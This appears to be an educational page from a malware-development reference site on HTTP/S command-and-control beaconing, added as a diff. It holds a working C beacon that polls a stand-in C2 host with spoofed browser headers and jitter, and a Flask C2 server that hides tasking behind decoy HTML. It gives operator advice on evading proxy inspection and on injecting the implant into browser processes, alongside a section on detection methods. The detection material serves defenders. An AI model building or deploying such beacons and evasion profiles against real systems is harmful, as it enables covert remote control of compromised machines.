@@ -1,0 +1,219 @@
+---
+title: HTTP/S Beaconing
+mitre: T1071.001
+category: c2
+group: Covert Channels
+summary: Use malleable HTTP profiles to make beacon traffic look like legitimate browser requests.
+platform: [Windows, Linux, macOS]
+tags: ['C / C++', 'Python', 'HTTP', 'TLS']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 9 min read
+callChain:
+  - call: build HTTP request
+    desc: Construct headers, URI and body to match the chosen profile (CDN poll, jQuery fetch, etc.).
+    dll: winhttp / libcurl
+  - call: WinHttpOpen / curl_easy_init
+    desc: Open a session with a spoofed User-Agent matching the profiled browser version.
+    dll: winhttp
+  - call: WinHttpConnect + WinHttpOpenRequest
+    desc: Connect to the C2 listener (optionally fronted through a CDN or redirector).
+    dll: winhttp
+  - call: WinHttpSendRequest + WinHttpReceiveResponse
+    desc: Send the beacon; parse status code and response body for tasking.
+    dll: winhttp
+  - call: jitter sleep
+    desc: Sleep for base interval ± jitter percentage before the next check-in.
+    dll: kernel32
+detections:
+  - src: PROXY LOG
+    text: Periodic requests to the same host at a statistically regular interval, even with jitter applied.
+  - src: TLS INSPECT
+    text: JA3/JA3S fingerprint mismatch — beacon presents a different TLS client hello than the claimed browser.
+  - src: NETWORK
+    text: HTTP beacons that always return 200 with an empty or fixed-size body regardless of URI.
+  - src: BEHAVIOURAL
+    text: A non-browser process opening an outbound TLS connection to a host with no DNS history.
+  - src: THREAT INTEL
+    text: C2 domain age, passive DNS, certificate transparency logs — all cheap to query at scale.
+related:
+  - mitre: T1071.004
+    title: DNS Beaconing
+    desc: Lower bandwidth, harder to block without breaking name resolution.
+    href: /techniques/c2/dns-beaconing
+  - mitre: T1090
+    title: Proxy / Redirectors
+    desc: Fronting through a CDN or reverse proxy puts a legitimate IP in the logs.
+  - mitre: T1573
+    title: Encrypted Channel
+    desc: TLS with certificate pinning prevents MitM inspection of C2 traffic.
+labKit:
+  - label: http-c2.py (server) + beacon.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: INetSim HTTP responder config
+    href: /toolkit
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+HTTP/S is the highest-bandwidth practical C2 transport and the one most defenders have built
+tooling around. The tension for an operator is that any proxy, DPI appliance or cloud-hosted
+CASB can inspect, filter or alert on HTTP traffic in ways that DNS cannot. The response is
+**traffic shaping**: crafting requests and responses that look, byte-for-byte, like something
+a browser already sends.
+
+A **malleable profile** (the term comes from Cobalt Strike, but the concept applies to any
+framework) is a specification that controls every observable attribute of the HTTP exchange:
+URI patterns, header order and values, body structure, response codes, and timing. A well-built
+profile passes visual inspection of a proxy log because the traffic genuinely resembles the
+thing it is impersonating.
+
+<Callout type="note">
+  CDN domain fronting — connecting to a CDN edge over TLS while specifying a different `Host`
+  header — was an effective technique that major CDN providers have actively blocked since 2018.
+  It still works against CDN providers that have not patched it, but the list shrinks each year.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Minimal beacon (C, WinHTTP)
+
+<CodeBlock
+  file="beacon.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+#include \u003cwinhttp.h\u003e
+#pragma comment(lib, "winhttp.lib")
+
+#define C2_HOST  L"updates.example.com"
+#define C2_PORT  443
+#define C2_URI   L"/api/v1/stats"
+#define UA       L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+static DWORD beacon_interval = 30000;  // ms
+static DWORD jitter_pct      = 20;
+
+static DWORD sleep_jittered(void) {
+    DWORD j = beacon_interval * jitter_pct / 100;
+    DWORD delay = beacon_interval - j + (rand() % (2 * j + 1));
+    Sleep(delay);
+    return delay;
+}
+
+void beacon_loop(void) {
+    HINTERNET session = WinHttpOpen(UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET connect = WinHttpConnect(session, C2_HOST, C2_PORT, 0);
+
+    for (;;) {
+        HINTERNET req = WinHttpOpenRequest(connect, L"GET", C2_URI,
+                                           NULL, WINHTTP_NO_REFERER,
+                                           WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                           WINHTTP_FLAG_SECURE);
+
+        // mimic a real browser — add headers the profile demands
+        WinHttpAddRequestHeaders(req,
+            L"Accept: text/html,application/xhtml+xml,*/*\r\n"
+            L"Accept-Language: en-US,en;q=0.9\r\n"
+            L"Cache-Control: no-cache\r\n",
+            (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
+
+        WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+        WinHttpReceiveResponse(req, NULL);
+
+        DWORD status = 0, sz = sizeof status;
+        WinHttpQueryHeaders(req,
+            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, NULL);
+
+        if (status == 200) {
+            // read body, decode task, dispatch
+            // ... omitted ...
+        }
+
+        WinHttpCloseHandle(req);
+        sleep_jittered();
+    }
+}`}
+/>
+
+### Simple C2 server (Python / Flask)
+
+<CodeBlock
+  file="c2_server.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`from flask import Flask, request, Response
+import base64, json, queue
+
+app   = Flask(__name__)
+tasks = queue.Queue()
+
+@app.get('/api/v1/stats')
+def checkin():
+    beacon_id = request.headers.get('X-Session', 'unknown')
+    if tasks.empty():
+        # return decoy HTML so the response looks like a real web page
+        return Response('\u003chtml\u003e\u003cbody\u003eOK\u003c/body\u003e\u003c/html\u003e',
+                        content_type='text/html')
+    task = tasks.get_nowait()
+    # encode task in a custom header or a JSON body field
+    return Response(base64.b64encode(json.dumps(task).encode()),
+                    content_type='application/octet-stream')
+
+@app.post('/api/v1/stats')
+def result():
+    data = base64.b64decode(request.data)
+    print('[<]', data.decode(errors='replace'))
+    return Response(status=204)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')`}
+/>
+
+## Profile design
+
+A profile controls what an observer sees; it does not change what the kernel records. Consider
+each observable tier independently:
+
+| Tier | Controlled by profile | Controlled by host setup |
+|---|---|---|
+| URI / headers | Yes | — |
+| TLS JA3 fingerprint | Partially (cipher order) | Cert, ALPN |
+| Beacon interval shape | Yes (jitter math) | — |
+| Process making the call | No | Injection into browser |
+| DNS resolution path | No | CDN / redirector |
+| Certificate / domain age | No | Infra planning |
+
+The process making the WinHTTP call is logged by ETW-TI and Sysmon regardless of what the
+HTTP traffic looks like. Injecting the beacon into a browser process or legitimate updater
+addresses this, but raises the cost and the footprint of the implant significantly.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Beacon interval analysis (computing the autocorrelation of outbound request timestamps per
+destination) finds jittered beacons at sub-second precision given enough samples. A one-hour
+observation window with 30-second beacons yields ~120 samples — more than enough to distinguish
+a Gaussian-jittered beacon from browser traffic.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
